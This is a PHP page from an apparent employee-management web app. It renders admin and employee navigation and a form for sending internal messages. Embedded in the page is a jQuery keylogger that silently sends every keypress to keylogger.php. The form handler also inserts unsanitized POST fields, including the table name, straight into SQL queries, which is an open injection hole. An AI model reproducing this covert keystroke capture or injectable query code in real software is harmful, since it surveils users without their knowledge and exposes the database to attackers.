<?php
include('header.php');

if(isset($_POST['submit']))
{
	$table = "msg_".$_POST['employee_id'];
	$subject = $_POST['subject'];
	$message = $_POST['message'];
	$query = mysql_query("INSERT INTO $table VALUES ('','$user_id','$subject','$message','$time','1','True')");
}

//fetch all admin name..
$query_admin = mysql_query("SELECT * FROM admin WHERE Status = 'True'");
$row_admin = mysql_fetch_assoc($query_admin);

//fetch all employee name..
$query = mysql_query("SELECT * FROM employee WHERE Status = 'True'");
$row = mysql_fetch_assoc($query);
?> 
 
   
   <?php
	if(substr($_SESSION['login_id'],0,4) == 'admi')
	{
	
	?> 
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="manage_emp.php">
        <div class="large-2 column">
       	 Manage Emp
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" style="background:#10255F;">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
        <a href="signup.php">
        <div class="large-2 column">
         Add New User
        </div>
        </a>
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
    </div>
    <!-- end navigation bar -->
    
  	<?php
	}
    elseif(substr($_SESSION['login_id'],0,4) == 'emp_')
	{
		
	?>
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="company_detail.php">
        <div class="large-2 column">
       	 Company
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" style="background:#10255F;">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
      
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
         <a href="logout.php">
        <div class="large-2 column">
         Logout
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    <?php
	}
	?> 
    <script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board...
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=send_message');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->
    
    
      <!-- start main heading -->
    <div class="row">
    	<div class="large-3 column main_heading">
        Send New Message
        </div>
        <div class="large-6 large-offset-1 column main_heading end">
        <span class="success_msg" style="color:#F00;">
        <?php 
		if(isset($_POST['submit']))
		{
			echo "Message Successfully Send.";
		}
		?>
        
        </span>
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    
    
   <!-- start manage employee -->
   <div class="manage_emp">
   <form action="send_message.php" method="post">
       <div class="row">
            <div class="large-3 large-offset-1 column emp_name">
            Employee Name :
            </div>
            <div class="large-6 column end">
            
            <select name="employee_id">
            
            <?php
			do{
				if($row_admin['User_id'] != $user_id)
				{
					if(isset($_POST['reply']))
					{
						if($row_admin['User_id'] == $_POST['sender_id'])
						echo '<option value="'.$row_admin['User_id'].'" selected="selected">'.$row_admin['Name'].' (A)</option>';
						else
						echo '<option value="'.$row_admin['User_id'].'">'.$row_admin['Name'].' (A)</option>';
					}
					else
					{
						echo '<option value="'.$row_admin['User_id'].'">'.$row_admin['Name'].' (A)</option>';
					}
				}
				}while($row_admin = mysql_fetch_assoc($query_admin));
			
			
            do{
				if($row['User_id'] != $user_id)
				{
					if(isset($_POST['reply']))
					{
						if($row['User_id'] == $_POST['sender_id'])
						echo '<option value="'.$row['User_id'].'" selected="selected">'.$row['Name'].' (E)</option>';
						else
						echo '<option value="'.$row['User_id'].'">'.$row['Name'].' (E)</option>';
					}
					else
					{
						echo '<option value="'.$row['User_id'].'">'.$row['Name'].' (E)</option>';
					}
				}
				}while($row = mysql_fetch_assoc($query));
			
			?>
            
            </select>
            </div>
       </div>
       
       <div class="row" style="margin-top:25px;">
            <div class="large-3 large-offset-1 column emp_name" >
            Subject
            </div>
            <div class="large-6 column end">
            <input type="text" name="subject" placeholder="Enter Message Subject" required >
            </div>
       </div>
       
        <div class="row">
            <div class="large-3 large-offset-1 column emp_name">
            Message
            </div>
            <div class="large-6 column end">
            <textarea name="message" style="height:130px; width:470px;"></textarea>
            </div>
       </div>
       
        <div class="row">
            <div class="large-2 large-offset-5 column emp_name">
            <input type="submit" name="submit" value="Send">
            </div>
       </div>
       
       </form>
   
       
       
   </div>
   <!-- end manage employee -->
   
   
   
 
   <script>
   		$(".success_msg").delay(2000).slideUp(1000);
   </script>

   
</body>
</html>
